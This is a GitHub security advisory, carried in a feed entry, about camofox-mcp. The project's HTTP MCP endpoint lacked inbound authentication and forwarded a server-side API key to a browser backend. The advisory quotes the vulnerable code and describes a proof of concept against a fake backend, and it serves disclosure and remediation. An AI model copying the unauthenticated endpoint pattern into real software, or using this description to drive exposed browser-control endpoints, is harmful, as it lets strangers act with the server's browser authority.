        <title type="html"><![CDATA[[camofox-mcp] CamoFox MCP: Unauthenticated HTTP MCP browser-control surface]]></title>
        <id>https://github.com/advisories/GHSA-7hgr-7h44-33w2</id>
        <link href="https://github.com/advisories/GHSA-7hgr-7h44-33w2"/>
        <updated>2026-05-19T20:13:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthenticated-http-mcp-browser-control-surface-in-camofox-mcp">Unauthenticated HTTP MCP browser-control surface in <code>camofox-mcp</code></h1>
<h2 id="summary">Summary</h2>
<p><code>camofox-mcp</code> exposed a Streamable HTTP MCP endpoint at <code>/mcp</code> with rate limiting but no inbound MCP-layer authentication. When HTTP mode was enabled, any client that could reach <code>/mcp</code> could list and invoke browser-control tools.</p>
<p>If <code>CAMOFOX_API_KEY</code> was configured, the server then forwarded that server-side key to the underlying <code>camofox-browser</code> backend. That means an unauthenticated MCP caller could exercise the server's browser authority without knowing the backend browser API key.</p>
<p>Reviewed vulnerable commit: <code>10e3ac08cb50d830eb4ee00a789229f02f28a1a4</code>
Fixed commit observed on main: <code>599f56ee40f8062aeca541c251ed1d39fb437f50</code>
Fixed release observed: <code>v1.13.2</code>
Suggested severity: High, with the caveat that default loopback-only deployments reduce practical exposure.</p>
<h2 id="root-cause">Root cause</h2>
<p>In the reviewed commit, <code>src/http.ts</code> creates the Express MCP app and applies only a rate limiter to <code>/mcp</code>:</p>
<pre><code class="language-ts">const app = createMcpExpressApp({ host: config.httpHost });

const limiter = rateLimit({
  windowMs: 60_000,
  limit: config.httpRateLimit,
  standardHeaders: true,
  legacyHeaders: false
});

app.use("/mcp", limiter);
</code></pre>
<p>The <code>POST /mcp</code> handler then creates a server and <code>StreamableHTTPServerTransport</code> and passes the request body into the MCP transport without checking <code>Authorization</code>, an inbound API key, allowed hosts, or public-bind safety:</p>
<pre><code class="language-ts">app.post("/mcp", async (req: any, res: any) =&gt; {
  try {
    const { server } = createServer(config);
    const transport = new StreamableHTTPServerTransport({ sessionIdGenerator: undefined });

    await server.connect(transport);
    await transport.handleRequest(req, res, req.body);
</code></pre>
<p><code>src/config.ts</code> made HTTP mode configurable and defaulted the HTTP host to loopback, but it did not require an inbound HTTP client secret:</p>
<pre><code class="language-ts">transport: cli.transport ?? envTransport ?? "stdio",
httpPort: cli.httpPort ?? (Number.isNaN(httpPortFromEnv) ? 3000 : httpPortFromEnv),
httpHost: cli.httpHost ?? env.CAMOFOX_HTTP_HOST ?? "127.0.0.1",
</code></pre>
<p>Separately, <code>src/client.ts</code> forwarded <code>CAMOFOX_API_KEY</code> server-side to the browser backend:</p>
<pre><code class="language-ts">if (this.apiKey) {
  headers.set("x-api-key", this.apiKey);
  headers.set("authorization", `Bearer ${this.apiKey}`);
}
</code></pre>
<p>So <code>CAMOFOX_API_KEY</code> protected the MCP server's outbound requests to the backend browser service, but did not authenticate inbound HTTP MCP clients.</p>
<h2 id="auth-boundary">Auth boundary</h2>
<p>The vulnerable boundary was the HTTP MCP endpoint. The client did not need to provide <code>Authorization</code> or any <code>CAMOFOX_API_KEY</code> value to call MCP tools.</p>
<p>The default bind was <code>127.0.0.1</code>, which lowers severity for default local-only deployments. The risky cases are documented HTTP/remote-client deployments, Docker/port-forwarded deployments, or any environment where a browser page, local network client, reverse proxy, or another user can reach the <code>/mcp</code> endpoint.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>I used a fake <code>camofox-browser</code> backend so no real browser was launched and no external navigation occurred. The harness starts the reviewed <code>dist/http.js</code> server with <code>CAMOFOX_API_KEY=server-side-secret</code>, connects an MCP SDK client to <code>/mcp</code> with no auth headers, lists tools, then calls <code>create_tab</code> and <code>navigate</code>.</p>
<p>Observed output:</p>
<pre><code class="language-json">{
  "authUsedByClient": false,
  "listedToolCount": 46,
  "backendRequests": [
    {
      "method": "POST",
      "url": "/tabs",
      "headers": {
        "authorization": "Bearer server-side-secret",
        "x-api-key": "server-side-secret"
      }
    },
    {
      "method": "POST",
      "url": "/tabs/fake-tab-1/navigate",
      "headers": {
        "authorization": "Bearer server-side-secret",
        "x-api-key": "server-side-secret"
      }
    }
  ],
  "observedUnauthenticatedBrowserControl": true,
  "serverSideSecretForwardedToBackend": true
}
</code></pre>
<p>This demonstrates both parts of the issue:</p>
<ol>
<li>The MCP client used no inbound authentication.</li>
<li>The server still used its configured backend browser secret when forwarding the tool calls.</li>
</ol>
<h2 id="impact">Impact</h2>
<p>An unauthenticated client that can reach the HTTP MCP endpoint can exercise browser-control tools as the MCP server. Depending on the user's active browser profiles and configured backend, that can allow page navigation, tab creation, interaction with authenticated browser contexts, screenshot/content observation, and other browser-automation actions exposed by the MCP tool surface.</p>
<p>The impact is strongest when HTTP mode is intentionally exposed for remote MCP clients or through Docker/reverse-proxy deployment and the operator assumes <code>CAMOFOX_API_KEY</code> protects the whole control plane.</p>
<h2 id="fix-notes">Fix notes</h2>
<p>The public issue indicates this has been fixed in <code>599f56e</code> and released as <code>v1.13.2</code> by adding dedicated inbound <code>CAMOFOX_HTTP_API_KEY</code> Bearer auth, public-bind startup validation, auth before <code>/mcp</code> JSON parsing, loopback Host-header protection, and optional allowed-hosts handling. Those are the right mitigation directions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/redf0x1/camofox-mcp/security/advisories/GHSA-7hgr-7h44-33w2">https://github.com/redf0x1/camofox-mcp/security/advisories/GHSA-7hgr-7h44-33w2</a></li>
<li><a href="https://github.com/redf0x1/camofox-mcp/commit/599f56ee40f8062aeca541c251ed1d39fb437f50">https://github.com/redf0x1/camofox-mcp/commit/599f56ee40f8062aeca541c251ed1d39fb437f50</a></li>
<li><a href="https://github.com/advisories/GHSA-7hgr-7h44-33w2">https://github.com/advisories/GHSA-7hgr-7h44-33w2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hgr-7h44-33w2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T20:13:35.000Z</published>
    </entry>
</feed>